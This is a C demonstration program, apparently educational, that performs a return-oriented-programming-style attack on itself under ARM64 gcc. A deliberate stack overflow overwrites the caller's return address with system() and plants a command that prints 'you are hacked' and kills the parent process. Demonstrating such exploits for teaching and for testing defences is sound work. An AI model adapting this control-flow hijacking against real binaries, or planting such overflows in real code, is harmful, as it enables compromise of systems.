// Sample ROP attack.
//
// The effect of this attack is to take control of the system: a shell command
// is run and the application terminates. Of course, the shellcode can do any
// nasty thing...

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define NOINLINE __attribute__((noinline))

// In the real world, a ROP attack is designed for a given version of a binary.
// This example was tested on Linux with gcc. With gcc, the stack frame [x29,x30]
// is saved at the bottom of the stack. The code which is generated by clang is
// different and would need another form of malicious payload.

#if defined(__clang__) || defined(__llvm__)
#error "this ROP attack is defined for gcc, not clang"
#endif

// Shellcode input data: "echo === shellcode running, you are hacked ===; kill $PPID"
static const uint8_t shellcode[] = {
    0x65, 0x63, 0x68, 0x6F, 0x20, 0x3D, 0x3D, 0x3D, 0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F,
    0x64, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x6E, 0x69, 0x6E, 0x67, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x20,
    0x61, 0x72, 0x65, 0x20, 0x68, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x3D, 0x3D, 0x3D, 0x3B, 0x20,
    0x6B, 0x69, 0x6C, 0x6C, 0x20, 0x24, 0x50, 0x50, 0x49, 0x44, 0x00
};
    
NOINLINE char* function_with_stack_overflow(char* p)
{
    // This function is supposed to overflow its local buffer with input coming
    // from outside (data file or network). We simulate injection of invalid
    // data. Normally, the attacker knows the binary code and the structure of
    // the stack and directly inject the corrupted data. To make this sample
    // more flexible, we build the data manually.

    uint64_t buf[2]; // the buffer we overflow

    printf("in function_with_stack_overflow()\n");

    // Access in range.
    buf[1] = 0;

    // With gcc, the stack frame [x29,x30] is before the local variable.
    // When we overflow buf[], we trash the caller's stack frame, not the current one.
    // The caller is some_function().
    uint64_t* x29;
    asm("mov %x0, x29\n" : "=r" (x29));
    int caller_x29_index = (uint64_t*)x29[0] - buf;

    // Overflow #1: override caller's stack frame: put system() as return address.
    buf[caller_x29_index + 1] = (uint64_t)system;

    // In caller some_function(), the result is returned as: ldr x0, [sp, 40]
    // Overwrite this with a command string, it will be used as system() parameter.
    // Because gcc places the stack frame [x29,x30] at start, caller's sp and x29 are equal.
    // Overflow #2: overwrite caller_29 + 40 bytes (5 uint64_t) with address and content
    // of the shellcode command.
    buf[caller_x29_index + 5] = (uint64_t)&buf[caller_x29_index + 6];
    memcpy(&buf[caller_x29_index + 6], shellcode, sizeof(shellcode));

    return NULL;
}

NOINLINE char* some_function(char* p)
{
    char* x = NULL;
    function_with_stack_overflow(p);
    return x;
}

int main(int argc, char* argv[])
{
    char buffer[1024];
    some_function(buffer);
    return EXIT_SUCCESS;
}
